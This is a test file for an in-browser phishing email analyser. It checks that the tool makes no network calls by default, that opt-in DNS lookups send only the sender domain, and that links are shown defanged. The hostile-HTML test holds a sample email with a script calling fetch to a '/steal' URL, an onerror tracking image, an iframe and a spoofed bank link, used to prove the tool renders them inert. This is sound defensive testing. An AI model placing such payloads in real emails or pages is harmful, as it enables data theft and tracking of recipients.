import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { cleanup, render, screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import App from '../src/App'
import { analyze } from '../src/analyze'
import { buildReport } from '../src/report'
import { SAMPLES } from '../src/samples'
import { DOH_HOST, isQueryableDomain, lookupSenderDomain, dnsFindings } from '../src/doh'
import { BASE_HEADERS, mail } from './helpers'

const verdict = () => screen.findByRole('heading', { level: 2, name: /^(Looks fine|Be careful|Suspicious|Likely phishing)$/ })

/** Every way a page could talk to the network, all replaced with tripwires. */
function installTripwires() {
  const calls: string[] = []
  const trip = (name: string) => () => {
    calls.push(name)
    throw new Error(`network access attempted: ${name}`)
  }
  vi.stubGlobal('fetch', vi.fn(async (...a: unknown[]) => { calls.push('fetch ' + String(a[0])); throw new Error('fetch blocked') }))
  vi.stubGlobal('XMLHttpRequest', function XHR() { trip('XMLHttpRequest')() })
  vi.stubGlobal('WebSocket', function WS() { trip('WebSocket')() })
  vi.stubGlobal('EventSource', function ES() { trip('EventSource')() })
  vi.stubGlobal('Image', function Img() { trip('Image')() })
  Object.defineProperty(navigator, 'sendBeacon', { value: trip('sendBeacon'), configurable: true })
  return calls
}

afterEach(() => {
  cleanup()
  vi.unstubAllGlobals()
})

describe('privacy: no network calls with enrichment off (SR-3)', () => {
  let calls: string[]
  beforeEach(() => { calls = installTripwires() })

  it('analysing all samples and building reports makes no request', () => {
    for (const s of SAMPLES) {
      const r = analyze(s.raw)
      expect(r.ok).toBe(true)
      if (r.ok) buildReport(r)
    }
    expect(calls).toEqual([])
  })

  it('using the whole UI (samples, tabs, links, checklist) makes no request', async () => {
    const user = userEvent.setup()
    render(<App />)
    for (const s of SAMPLES) {
      await user.click(screen.getByRole('button', { name: new RegExp(s.label, 'i') }))
      await verdict()
      for (const tab of ['Headers', 'Links', 'Checklist', 'Findings']) await user.click(screen.getByRole('tab', { name: tab }))
    }
    expect(calls).toEqual([])
  })

  it('the DNS switch is off by default', () => {
    render(<App />)
    expect(screen.getByRole('switch', { name: /check dns records/i })).toHaveAttribute('aria-checked', 'false')
    expect(screen.getAllByText(/only the sender's domain name/i).length).toBeGreaterThan(0)
  })
})

describe('optional DNS enrichment (opt-in)', () => {
  it('contacts only the DoH host and only with the sender domain', async () => {
    const urls: string[] = []
    vi.stubGlobal('fetch', vi.fn(async (url: string, init?: RequestInit) => {
      urls.push(url)
      expect(init?.credentials).toBe('omit')
      expect(init?.method ?? 'GET').toBe('GET')
      expect(init?.body).toBeUndefined()
      const name = new URL(url).searchParams.get('name') ?? ''
      const type = new URL(url).searchParams.get('type')
      const body = name.startsWith('_dmarc.')
        ? { Status: 0, Answer: [{ type: 16, data: '"v=DMARC1; p=none"' }] }
        : type === 'TXT' ? { Status: 0, Answer: [{ type: 16, data: '"v=spf1 -all"' }] } : { Status: 0, Answer: [{ type: 1, data: '203.0.113.5' }] }
      return new Response(JSON.stringify(body), { status: 200, headers: { 'content-type': 'application/dns-json' } })
    }))
    const user = userEvent.setup()
    render(<App />)
    await user.click(screen.getByRole('button', { name: /lookalike-domain phish/i }))
    await verdict()
    expect(urls).toEqual([])
    await user.click(screen.getByRole('switch', { name: /check dns records/i }))
    await waitFor(() => expect(urls.length).toBeGreaterThanOrEqual(3))
    const secret = ['password', 'billing', 'Account Services', 'user@example.com', 'subscription']
    for (const u of urls) {
      const parsed = new URL(u)
      expect(parsed.protocol).toBe('https:')
      expect(parsed.host).toBe(DOH_HOST)
      expect(parsed.pathname).toBe('/dns-query')
      const name = parsed.searchParams.get('name')!
      expect(['rnicrosoft.test', '_dmarc.rnicrosoft.test']).toContain(name)
      for (const s of secret) expect(u.toLowerCase()).not.toContain(s.toLowerCase())
    }
    expect(await screen.findByTestId('dns-summary')).toHaveTextContent(/SPF published/)
  })

  it('turning it back off stops the summary being applied', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify({ Status: 3 }), { status: 200 })))
    const user = userEvent.setup()
    render(<App />)
    await user.click(screen.getByRole('button', { name: /legitimate newsletter/i }))
    await verdict()
    const sw = screen.getByRole('switch', { name: /check dns records/i })
    await user.click(sw)
    await screen.findByTestId('dns-summary')
    await user.click(sw)
    expect(screen.queryByTestId('dns-summary')).toBeNull()
  })

  it('refuses to query anything that is not a plain hostname', async () => {
    const f = vi.fn()
    for (const bad of ['', '1.2.3.4', 'a b.com', 'x.com/../secret', 'user@example.com', 'localhost', 'a'.repeat(300) + '.com', 'exa_mple.com', 'https://example.com']) {
      expect(isQueryableDomain(bad), bad).toBe(false)
      await lookupSenderDomain(bad, f as unknown as typeof fetch)
    }
    expect(f).not.toHaveBeenCalled()
    expect(isQueryableDomain('mail.example.com')).toBe(true)
    expect(isQueryableDomain('xn--pypal-4ve.com')).toBe(true)
  })

  it('turns NXDOMAIN into a finding and survives failures', async () => {
    const nx = vi.fn(async () => new Response(JSON.stringify({ Status: 3 }), { status: 200 }))
    const s = await lookupSenderDomain('nothing.example.test', nx as unknown as typeof fetch)
    expect(s.exists).toBe(false)
    expect(dnsFindings(s).map((f) => f.code)).toContain('DNS.nxdomain')
    const boom = vi.fn(async () => { throw new Error('offline') })
    const s2 = await lookupSenderDomain('example.com', boom as unknown as typeof fetch)
    expect(s2.errors.length).toBeGreaterThan(0)
    expect(dnsFindings(s2)).toEqual([])
  })
})

describe('A4 / SR-1: hostile HTML body is inert', () => {
  const hostile = mail(
    { ...BASE_HEADERS, 'Content-Type': 'text/html; charset=utf-8' },
    '<html><body><script>window.__pwned = true; fetch("http://203.0.113.9/steal")</script>' +
      '<img src="http://203.0.113.9/track.gif" onerror="window.__pwned = true">' +
      '<iframe src="http://203.0.113.9/frame"></iframe><link rel="stylesheet" href="http://203.0.113.9/x.css">' +
      '<a href="http://203.0.113.9/login" onclick="window.__pwned=true">www.bank.com</a><p>Hello visible text</p></body></html>',
  )

  it('renders as escaped text only, with no script/img/iframe elements and no requests', async () => {
    const calls = installTripwires()
    const user = userEvent.setup()
    const { container } = render(<App />)
    await user.click(screen.getByLabelText(/raw email source/i))
    await user.paste(hostile)
    await user.click(screen.getByRole('button', { name: /analyse email/i }))
    await verdict()

    // body text is the *extracted text*, with markup never rendered
    const pre = screen.getByTestId('body-text')
    expect(pre.textContent).toContain('Hello visible text')
    expect(pre.querySelector('*')).toBeNull()

    for (const sel of ['script', 'img', 'iframe', 'object', 'embed', 'link', 'form', 'video', 'audio', 'svg image']) {
      expect(container.querySelector(sel), sel).toBeNull()
    }
    // the only anchor in the UI is the app's own home link
    const anchors = [...document.querySelectorAll('a')]
    expect(anchors.every((a) => a.getAttribute('href') === '/')).toBe(true)
    expect([...document.querySelectorAll('*')].some((el) => [...el.attributes].some((a) => a.name.startsWith('on')))).toBe(false)
    expect((window as unknown as { __pwned?: boolean }).__pwned).toBeUndefined()
    expect(calls).toEqual([])

    // links tab shows it as plain, defanged text
    await user.click(screen.getByRole('tab', { name: 'Links' }))
    const row = screen.getByTestId('link-row')
    expect(within(row).getByTestId('link-defanged').textContent).toBe('hxxp[://]203[.]0[.]113[.]9/login')
    expect(row.querySelector('a')).toBeNull()
    expect(within(row).getByText(/Text shows a different site/)).toBeInTheDocument()
    expect(calls).toEqual([])
  })

  it('plain-text body containing markup is shown literally', async () => {
    const raw = mail({ ...BASE_HEADERS, 'Content-Type': 'text/plain' }, '<script>alert(1)</script> <img src=http://203.0.113.9/p.gif>')
    const r = analyze(raw)
    expect(r.ok && r.ctx.bodyText).toContain('<script>alert(1)</script>')
    const user = userEvent.setup()
    const { container } = render(<App />)
    await user.click(screen.getByLabelText(/raw email source/i))
    await user.paste(raw)
    await user.click(screen.getByRole('button', { name: /analyse email/i }))
    await verdict()
    expect(screen.getByTestId('body-text').textContent).toContain('<script>alert(1)</script>')
    expect(container.querySelector('script, img')).toBeNull()
  })
})

describe('UI states', () => {
  it('shows the friendly error state for non-email input with instructions', async () => {
    const user = userEvent.setup()
    render(<App />)
    await user.click(screen.getByLabelText(/raw email source/i))
    await user.paste('just a paragraph someone copied from a web page')
    await user.click(screen.getByRole('button', { name: /analyse email/i }))
    expect(await screen.findByRole('alert')).toHaveTextContent(/doesn't look like raw email source/i)
    expect(screen.getByRole('alert')).toHaveTextContent(/Show original/)
    expect(screen.getByRole('alert')).toHaveTextContent(/View message source/)
    expect(screen.getByRole('alert')).toHaveTextContent(/Raw Source/)
  })
  it('has the empty state and the how-to accordion', () => {
    render(<App />)
    expect(screen.getByText(/nothing to check yet/i)).toBeInTheDocument()
    expect(screen.getByText(/how to get the raw source/i)).toBeInTheDocument()
    expect(screen.getByText(/how the score works/i)).toBeInTheDocument()
    expect(screen.getByText(/your email never leaves your browser/i)).toBeInTheDocument()
  })
  it('obvious phish sample: Likely phishing, top reasons, received chain with delays, links never clickable', async () => {
    const user = userEvent.setup()
    render(<App />)
    await user.click(screen.getByRole('button', { name: /obvious phish/i }))
    expect(await screen.findByRole('heading', { name: 'Likely phishing', level: 2 })).toBeInTheDocument()
    expect(screen.getByText('Top reasons')).toBeInTheDocument()
    await user.click(screen.getByRole('tab', { name: 'Headers' }))
    const rows = screen.getAllByTestId('hop-row')
    expect(rows).toHaveLength(3)
    const delays = screen.getAllByTestId('hop-delay').map((e) => e.textContent)
    expect(delays).toEqual(['start', '10m 16s', '2s'])
    await user.click(screen.getByRole('tab', { name: 'Links' }))
    expect(screen.getAllByTestId('link-row').length).toBeGreaterThanOrEqual(2)
    expect(document.querySelectorAll('a[href^="http"]').length).toBe(0)
  })
  it('newsletter sample shows good signs', async () => {
    const user = userEvent.setup()
    render(<App />)
    await user.click(screen.getByRole('button', { name: /legitimate newsletter/i }))
    expect(await screen.findByRole('heading', { name: 'Looks fine', level: 2 })).toBeInTheDocument()
    expect(screen.getAllByText('Good signs').length).toBeGreaterThan(0)
  })
  it('copy-all-defanged copies defanged text only', async () => {
    const write = vi.fn(async () => {})
    const user = userEvent.setup()
    Object.defineProperty(navigator, 'clipboard', { value: { writeText: write }, configurable: true })
    render(<App />)
    await user.click(screen.getByRole('button', { name: /obvious phish/i }))
    await screen.findByRole('heading', { name: 'Likely phishing', level: 2 })
    await user.click(screen.getByRole('tab', { name: 'Links' }))
    await user.click(screen.getByRole('button', { name: /copy all defanged/i }))
    expect(write).toHaveBeenCalledTimes(1)
    const text = (write.mock.calls[0] as unknown as [string])[0]
    expect(text).toContain('hxxp[://]')
    expect(text).not.toMatch(/https?:\/\//)
  })
})
